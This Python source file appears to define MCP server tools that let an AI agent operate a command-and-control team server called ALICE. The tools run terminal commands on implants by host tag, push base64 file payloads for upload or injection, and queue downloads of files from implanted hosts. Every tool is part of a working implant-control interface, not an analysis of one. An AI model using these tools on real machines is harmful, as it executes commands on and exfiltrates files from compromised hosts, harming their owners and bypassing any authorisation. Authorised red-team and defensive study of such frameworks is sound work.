import base64
import uuid
from logic.core import server
from logic import team_http

@server.tool(
    name="alice_terminal_command",
    description="Runs a terminal command on an implant via POST /api/terminal/.",
    annotations={"readOnlyHint": False, "destructiveHint": True, "openWorldHint": True},
)
def alice_terminal_command(host_tag, command):
    # Sends one implant command; requires human approval in the MCP host
    try:
        tag = team_http.validate_host_tag(host_tag)
        cmd = team_http.validate_command(command)
        body = {
            "command": cmd,
            "host_tag": tag,
            "source_terminal": "mcp_stdio",
        }
        payload = team_http.team_request("POST", "/api/terminal/", body=body)
    except Exception as exc:
        return team_http.format_team_response(
            {"status": "failure", "message": str(exc)},
        )

    status = str(payload.get("status", "")).strip().lower()

    if status == "failure":
        message = str(payload.get("message") or "terminal command failed")
        return team_http.format_team_response({"status": "failure", "message": message})

    if status and status != "success":
        return team_http.format_team_response(
            {"status": "failure", "message": f"unexpected terminal status: {status}"},
        )

    return team_http.format_team_response(payload)

@server.tool(
    name="alice_terminal_help",
    description="Fetches built-in terminal help or armory via POST /api/terminal/ (no host).",
    annotations={"readOnlyHint": True, "destructiveHint": False, "openWorldHint": False},
)
def alice_terminal_help(section="help"):
    # Runs help or armory on the team server terminal router
    cmd = team_http.validate_command(section)

    if cmd not in ("help", "armory"):
        raise ValueError("section must be help or armory")

    body = {"command": cmd, "source_terminal": "mcp_stdio"}
    payload = team_http.team_request("POST", "/api/terminal/", body=body)
    return team_http.format_team_response(payload)

@server.tool(
    name="alice_terminal_command_with_file",
    description=(
        "Runs a terminal command with a base64 file payload via POST /api/terminal/ "
        "using the __tmp_file_bytes__ JSON field (upload/injection commands)."
    ),
    annotations={"readOnlyHint": False, "destructiveHint": True, "openWorldHint": True},
)
def alice_terminal_command_with_file(host_tag, command, file_base64):
    # Attaches file bytes without embedding them in the command string
    try:
        tag = team_http.validate_host_tag(host_tag)
        cmd = team_http.validate_command(command)
        encoded = str(file_base64 or "").strip()

        if not encoded:
            raise ValueError("file_base64 must not be empty")

        try:
            base64.b64decode(encoded, validate=True)
        except Exception as exc:
            raise ValueError(f"file_base64 must be valid base64: {exc}") from exc
        body = {
            "command": cmd,
            "host_tag": tag,
            "source_terminal": "mcp_stdio",
            "__tmp_file_bytes__": encoded,
        }
        payload = team_http.team_request("POST", "/api/terminal/", body=body)
    except Exception as exc:
        return team_http.format_team_response(
            {"status": "failure", "message": str(exc)},
        )

    status = str(payload.get("status", "")).strip().lower()

    if status == "failure":
        message = str(payload.get("message") or "terminal command with file failed")
        return team_http.format_team_response({"status": "failure", "message": message})

    if status and status != "success":
        return team_http.format_team_response(
            {"status": "failure", "message": f"unexpected terminal status: {status}"},
        )

    return team_http.format_team_response(payload)

@server.tool(
    name="alice_terminal_upload_raw",
    description=(
        "Uploads bytes with x-terminal-meta and a raw body via POST /api/terminal/ "
        "(same as the ALICE client file-attach path)."
    ),
    annotations={"readOnlyHint": False, "destructiveHint": True, "openWorldHint": True},
)
def alice_terminal_upload_raw(host_tag, command, file_base64):
    # Uses raw octet-stream body plus URL-encoded metadata in a header
    try:
        tag = team_http.validate_host_tag(host_tag)
        cmd = team_http.validate_command(command)
        encoded = str(file_base64 or "").strip()

        if not encoded:
            raise ValueError("file_base64 must not be empty")

        try:
            raw = base64.b64decode(encoded, validate=True)
        except Exception as exc:
            raise ValueError(f"file_base64 must be valid base64: {exc}") from exc
        meta = {
            "command": cmd,
            "host_tag": tag,
            "source_terminal": "mcp_stdio",
        }
        payload = team_http.post_terminal_raw_upload(meta, raw)
    except Exception as exc:
        return team_http.format_team_response(
            {"status": "failure", "message": str(exc)},
        )

    status = str(payload.get("status", "")).strip().lower()

    if status == "failure":
        message = str(payload.get("message") or "terminal raw upload failed")
        return team_http.format_team_response({"status": "failure", "message": message})

    if status and status != "success":
        return team_http.format_team_response(
            {"status": "failure", "message": f"unexpected terminal status: {status}"},
        )

    return team_http.format_team_response(payload)

@server.tool(
    name="alice_terminal_download",
    description=(
        "Queues a remote file download via POST /api/terminal/ and summarizes the "
        "application/x-ndjson stream (progress/chunk metadata only, not file bytes)."
    ),
    annotations={"readOnlyHint": False, "destructiveHint": False, "openWorldHint": True},
)
def alice_terminal_download(
    host_tag,
    remote_path,
    local_path="",
    download_id="",
):
    # Mirrors the REST download_id and download_file optional fields
    try:
        tag = team_http.validate_host_tag(host_tag)
        remote = str(remote_path or "").strip()

        if not remote:
            raise ValueError("remote_path is required")

        local = str(local_path or "").strip()

        if not local:
            name = remote.replace("\\", "/").split("/")[-1] or "download"
            local = f"/tmp/{name}"

        cmd = f"download {remote} {local}"
        cmd = team_http.validate_command(cmd)
        transfer_id = str(download_id or "").strip() or f"mcp-{uuid.uuid4().hex[:12]}"
        file_label = local.replace("\\", "/").split("/")[-1] or "download"
        body = {
            "command": cmd,
            "host_tag": tag,
            "source_terminal": "mcp_stdio",
            "download_id": transfer_id,
            "download_file": file_label,
        }
        return team_http.post_terminal_download(body)
    except Exception as exc:
        return team_http.format_team_response(
            {"status": "failure", "message": str(exc)},
        )